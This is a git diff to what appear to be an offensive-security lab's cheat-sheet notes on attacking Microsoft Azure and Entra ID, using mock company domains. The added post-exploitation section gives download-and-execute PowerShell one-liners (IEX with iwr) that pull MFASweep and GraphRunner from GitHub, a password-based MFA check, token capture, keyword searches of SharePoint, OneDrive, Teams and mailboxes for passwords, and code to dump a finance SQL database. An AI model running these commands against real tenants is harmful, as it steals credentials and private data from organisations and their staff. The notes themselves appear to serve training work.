@@ -17,6 +17,7 @@ az account show
 
 Connect-MgGraph -UseDeviceAuthentication
 Get-MgContext
+Connect-MgGraph -UseDeviceAuthentication -Scopes "User.Read.All", "Directory.Read.All"         # May need this for MS365 License Enumeration
 
 Connect-AzAccount -UseDeviceAuthentication
 ```
@@ -139,13 +140,11 @@ az storage table list --account-name STORAGE --output table --auth-mode login
 ```
 
 Query the storage table:
-
 ```bash
 az storage entity query --table-name TABLE --account-name STORAGE --output table --auth-mode login
 ```
 
 To get all Entra ID users, open a PowerShell terminal and install the Microsoft Graph module with the command `Install-Module Microsoft.Graph` :
-
 ```PowerShell
 # Connect to Microsoft Graph
 Connect-MgGraph -UseDeviceAuthentication
@@ -187,6 +186,88 @@ Get-AzVM -ResourceGroupName "content-static-2" -Name "ACCOUNT" -UserData
 	UserData : <BASE64>
 [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<BASE64>"))
 ```
+
+### Post Exploitation - SharePoint, OneDrive, Exchange, Teams
+
+Check if MFA is enforced:
+```PowerShell
+IEX (iwr 'https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1')
+
+Invoke-MFASweep -Username first.last@megabigtech.com -Password <password> -Recon -IncludeADFS
+```
+
+Microsoft 365 applications rely on the Microsoft Graph API, and this could allow us to enumerate and exfiltrate user generated content! Check if our user has a MS365 license:
+
+```PowerShell
+Get-MgUserLicenseDetail -UserId "first.last@megabigtech.com"
+
+Connect-MgGraph -UseDeviceAuthentication -Scopes "User.Read.All", "Directory.Read.All"     # May need to reconnect with this to enumerate license information
+```
+
+A useful tool for finding loot in MS365 is `GraphRunner` post-exploitation toolset:
+
+```PowerShell
+IEX (iwr 'https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1')
+
+List-GraphRunnerModules
+Get-GraphTokens
+	# Successfully gets tokens and writes to the `$tokens` variable.
+```
+
+Use `GraphRunner` modules with `$token` variable set and search **SharePoint** and **OneDrive** for `password`:
+```PowerShell
+Get-Help Invoke-SearchSharePointAndOneDrive -examples
+Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'password'
+Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'bonus'
+```
+
+Use `GraphRunner` modules with `$token` variable set and search **Teams** for `password`:
+```PowerShell
+Invoke-SearchTeams -Tokens $tokens -SearchTerm password
+Invoke-SearchTeams -Tokens $tokens -SearchTerm bonus
+```
+
+Use `GraphRunner` modules with `$token` variable set and search **Mailbox** / **Exchange**for `password`:
+
+```PowerShell
+Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 40
+Invoke-SearchMailbox -Tokens $tokens -SearchTerm "bonus" -MessageCount 40
+```
+
+If an email is found to reveal credentials and a subdomain `mbt-example.database.win` (truncated `mbt-example.database.windows.net`) it can be used to interact with the database using PowerShell (*NOTE*: `mbt-finance.database.win` would need to be connected by calling it `mbt-finance.database.windows.net`):
+
+```PowerShell
+# Connect
+$conn = New-Object System.Data.SqlClient.SqlConnection
+$password='<password>'
+$conn.ConnectionString = "Server=mbt-finance.database.windows.net;Database=Finance;User ID=<username>;Password=$password;"
+$conn.Open()
+
+# List Tables
+$sqlcmd = $conn.CreateCommand()
+$sqlcmd.Connection = $conn
+$query = "SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';"
+$sqlcmd.CommandText = $query
+$adp = New-Object System.Data.SqlClient.SqlDataAdapter $sqlcmd
+$data = New-Object System.Data.DataSet
+$adp.Fill($data) | Out-Null
+$data.Tables
+
+# Enumerate the Table
+$sqlcmd = $conn.CreateCommand()
+$sqlcmd.Connection = $conn
+$query = "SELECT * FROM <TABLE>;"
+$sqlcmd.CommandText = $query
+$adp = New-Object System.Data.SqlClient.SqlDataAdapter $sqlcmd
+$data = New-Object System.Data.DataSet
+$adp.Fill($data) | Out-Null
+$data.Tables | ft
+
+# Close connection
+$conn.Close()
+```
+
+
 ---
 ### Blob example: `https://mbtwebsite.blob.core.windows.net/$web/...`
 
